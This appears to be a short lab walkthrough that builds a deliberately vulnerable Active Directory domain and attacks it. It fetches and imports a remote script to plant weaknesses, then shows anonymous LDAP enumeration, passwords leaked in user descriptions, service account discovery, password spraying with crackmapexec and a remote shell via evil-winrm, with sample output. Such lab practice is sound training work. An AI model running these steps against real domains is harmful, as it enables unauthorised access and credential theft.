# Installation
![[Pasted image 20210510205251.png]]
Change DomainName and DomainNetbiosName
```powershell
Install-ADDSForest -CreateDnsDelegation:$false -DatabasePath "C:\\Windows\\NTDS" -DomainMode "7" -DomainName "change.me" -DomainNetbiosName "change" -ForestMode "7" -InstallDns:$true -LogPath "C:\\Windows\\NTDS" -NoRebootOnCompletion:$false -SysvolPath "C:\\Windows\\SYSVOL" -Force:$true
(wget https://raw.githubusercontent.com/WaterExecution/vulnerable-AD-plus/master/vulnadplus.ps1).content | Out-File 'vulnadplus.ps1'
Import-Module vulnadplus.ps1
Invoke-VulnAD -UsersLimit 200 -DomainName "change.me"
```

# Initial Access
## Anonymous LDAP query
```bash
ldapsearch -h 10.10.10.244 -x -s base namingcontexts
```
```bash
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=change,DC=me
namingcontexts: CN=Configuration,DC=change,DC=me
namingcontexts: CN=Schema,CN=Configuration,DC=change,DC=me
namingcontexts: DC=DomainDnsZones,DC=change,DC=me
namingcontexts: DC=ForestDnsZones,DC=change,DC=me

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```
```bash
ldapsearch -h 10.10.10.244 -x -b "DC=change,DC=me" | grep -i description #-A 22 for username
```
``` bash
description: New user generated password: =W{Z5FM
description: New user generated password: @i@EJrd
description: New user generated password: &De0/tC
```
## Kerberoasting
```bash
ldapsearch -h 10.10.10.244 -x -b "DC=change,DC=me" | grep -i service
```
```bash
servicePrincipalName: mssql_svc/mssqlserver.change.me
servicePrincipalName: http_svc/httpserver.change.me
servicePrincipalName: exchange_svc/exserver.change.me
```
```bash
crackmapexec smb 10.10.10.244 -u user.txt -p password.txt --continue-on-success
```
```bash
[+] change.me\exchange_svc:freddy
```
```bash
evil-winrm -i 10.10.10.244 -u exchange_svc -p freddy
```